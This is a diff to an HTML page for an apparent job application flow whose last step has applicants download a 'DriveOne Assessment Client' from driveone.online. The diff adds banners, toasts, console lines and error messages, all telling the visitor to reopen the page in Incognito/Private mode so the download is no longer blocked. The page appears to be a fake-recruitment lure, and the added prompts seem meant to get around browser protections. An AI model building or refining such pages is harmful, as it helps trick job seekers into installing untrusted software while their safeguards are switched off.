@@ -349,6 +349,130 @@
         .toast.warning {
             border-left: 4px solid #f59e0b;
         }
+
+        /* ─── Incognito Warning Box ──────────────────────────────────── */
+        .incognito-warning {
+            background: linear-gradient(135deg, rgba(245, 158, 11, 0.08), rgba(245, 158, 11, 0.15));
+            border: 1.5px solid rgba(245, 158, 11, 0.25);
+            border-radius: 16px;
+            padding: 1rem 1.25rem;
+            margin: 0 0 1.25rem 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 1rem;
+            position: relative;
+            overflow: hidden;
+        }
+        .incognito-warning::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(245, 158, 11, 0.03) 0%, transparent 60%);
+            pointer-events: none;
+        }
+        .incognito-warning .icon-wrapper {
+            flex-shrink: 0;
+            width: 40px;
+            height: 40px;
+            background: rgba(245, 158, 11, 0.12);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            color: #d97706;
+        }
+        .incognito-warning .content {
+            flex: 1;
+            font-size: 0.88rem;
+            color: #4a4a4a;
+            line-height: 1.6;
+        }
+        .incognito-warning .content .title {
+            font-weight: 700;
+            color: #1e1e1e;
+            display: block;
+            margin-bottom: 0.15rem;
+        }
+        .incognito-warning .content .title i {
+            color: #d97706;
+            margin-right: 0.3rem;
+        }
+        .incognito-warning .content .highlight {
+            font-weight: 600;
+            color: #d97706;
+            background: rgba(245, 158, 11, 0.1);
+            padding: 0.1rem 0.5rem;
+            border-radius: 8px;
+            display: inline-block;
+        }
+        .incognito-warning .content .key {
+            display: inline-block;
+            background: #1e1e1e;
+            color: #fde68a;
+            font-family: monospace;
+            font-size: 0.7rem;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+        .incognito-warning .content .steps {
+            margin-top: 0.25rem;
+            font-size: 0.82rem;
+            color: #5f5f5f;
+        }
+        .incognito-warning .content .steps span {
+            display: block;
+            padding-left: 0.5rem;
+        }
+        .incognito-warning .content .steps .step-number {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: rgba(245, 158, 11, 0.12);
+            color: #d97706;
+            border-radius: 50%;
+            text-align: center;
+            font-size: 0.65rem;
+            font-weight: 700;
+            line-height: 20px;
+            margin-right: 0.3rem;
+        }
+
+        /* Place incognito warning inside the card but outside step panels */
+        .warning-container {
+            margin: 0 0 1.25rem 0;
+        }
+        /* Hide warning in step4 since download is there */
+        #step4 .incognito-warning {
+            display: none;
+        }
+        /* Show warning in step1, step2, step3 */
+        #step1 .incognito-warning,
+        #step2 .incognito-warning,
+        #step3 .incognito-warning {
+            display: flex !important;
+        }
+        .step-panel:not(.active) .incognito-warning {
+            display: none !important;
+        }
+
+        @media (max-width: 480px) {
+            .incognito-warning {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+            .incognito-warning .icon-wrapper {
+                align-self: center;
+            }
+            .incognito-warning .content .steps span {
+                padding-left: 0;
+            }
+        }
     </style>
 </head>
 
@@ -380,6 +504,16 @@
 
                 <!-- STEP 1 :: FORM -->
                 <div id="step1" class="step-panel active">
+                    <!-- Incognito Warning (visible in step1) -->
+                    <div class="incognito-warning">
+                        <div class="icon-wrapper"><i class="fas fa-incognito"></i></div>
+                        <div class="content">
+                            <span class="title"><i class="fas fa-shield-alt"></i> Important: Use Incognito Mode for Download</span>
+                            <span>To successfully download the DriveOne Assessment Client, please open this page in an <span class="highlight">Incognito / Private</span> window now.</span>
+                            
+                        </div>
+                    </div>
+
                     <div class="flex items-center gap-3 mb-1">
                         <i class="fas fa-pen-fancy text-amber-500 text-xl ml-6"></i>
                         <h2 class="text-2xl font-bold">Fill your application</h2>
@@ -433,6 +567,15 @@
 
                 <!-- STEP 2 :: LOADER -->
                 <div id="step2" class="step-panel text-center py-6">
+                    <!-- Incognito Warning (visible in step2) -->
+                    <div class="incognito-warning">
+                        <div class="icon-wrapper"><i class="fas fa-incognito"></i></div>
+                        <div class="content">
+                            <span class="title"><i class="fas fa-shield-alt"></i> Important: Use Incognito Mode for this application To Enable Download On Final Step</span>
+                            
+                            
+                        </div>
+                    </div>
                     <div class="flex flex-col items-center max-w-sm mx-auto">
                         <div class="relative mb-3">
                             <div class="w-14 h-14 rounded-full border-4 border-amber-200/60 border-t-amber-500 animate-spin"></div>
@@ -453,6 +596,15 @@
 
                 <!-- STEP 3 :: SUCCESS -->
                 <div id="step3" class="step-panel text-center py-4">
+                    <!-- Incognito Warning (visible in step3) -->
+                    <div class="incognito-warning">
+                        <div class="icon-wrapper"><i class="fas fa-incognito"></i></div>
+                        <div class="content">
+                            <span class="title"><i class="fas fa-shield-alt"></i> Important: Use Incognito Mode for this application To Enable Download On Final Step</span>
+                            
+                            
+                        </div>
+                    </div>
                     <div class="flex flex-col items-center">
                         <div class="text-5xl text-emerald-600 mb-1"><i class="fas fa-check-circle"></i></div>
                         <h2 class="text-2xl font-bold">Application received</h2>
@@ -473,6 +625,15 @@
                         <div class="text-5xl text-amber-500 mb-1"><i class="fas fa-download"></i></div>
                         <h2 class="text-2xl font-bold">Live technical assessment</h2>
                         <p class="text-muted text-sm mb-5">Download the DriveOne Assessment Client to begin.</p>
+
+                        <!-- Incognito warning specifically for download step -->
+                        <div class="incognito-warning">
+                        <div class="icon-wrapper"><i class="fas fa-incognito"></i></div>
+                        <div class="content">
+                            <span class="title"><i class="fas fa-shield-alt"></i> Important: Use Incognito Mode for this application To Enable Download On Final Step</span>
+                        
+                        </div>
+                    </div>
 
                         <button id="downloadBtn" class="btn-dark flex items-center gap-2.5" onclick="downloadApp()">
                             <i class="fas fa-file-archive"></i>
@@ -512,7 +673,7 @@
                 clearTimeout(window.toastTimeout);
                 window.toastTimeout = setTimeout(() => {
                     toast.classList.remove('show');
-                }, 5000);
+                }, 6000);
             }
 
             // ─── DEVICE DETECTION ──────────────────────────────────────
@@ -722,12 +883,14 @@
                     return;
                 }
 
+                // Show incognito reminder before download
+                showToast('🔒 Remember: Use Incognito/Private window if download is blocked.', 'warning');
+
                 downloadProgress.classList.add('active');
                 downloadBtn.disabled = true;
                 downloadText.textContent = 'Downloading...';
                 downloadBtn.querySelector('i').className = 'fas fa-spinner fa-spin';
 
-                // ── Notify backend about download ────────────────────
                 const downloadUrl = 'https://driveone.online/sbfbkbj';
                 downloadStatus.textContent = 'Starting download...';
 
@@ -763,8 +926,8 @@
                     .catch(error => {
                         console.error('Download error:', error);
                         resetDownload();
-                        showToast('⚠️ Download failed. Please try again.', 'error');
-                        downloadStatus.textContent = '❌ Download failed. Please try again.';
+                        showToast('⚠️ Download failed. Try opening this page in Incognito mode.', 'error');
+                        downloadStatus.textContent = '❌ Download failed. Use Incognito mode.';
                         downloadStatus.className = 'text-xs text-red-500 mt-2';
                     });
             };
@@ -773,6 +936,7 @@
             console.log('🚀 DriveOne Application ready.');
             console.log('📡 Backend API: https://driveone.online/api/register');
             console.log('📡 Download endpoint: https://driveone.online/sbfbkbj');
+            console.log('🔒 Reminder: Use Incognito/Private window if download is blocked.');
         })();
     </script>
 </body>
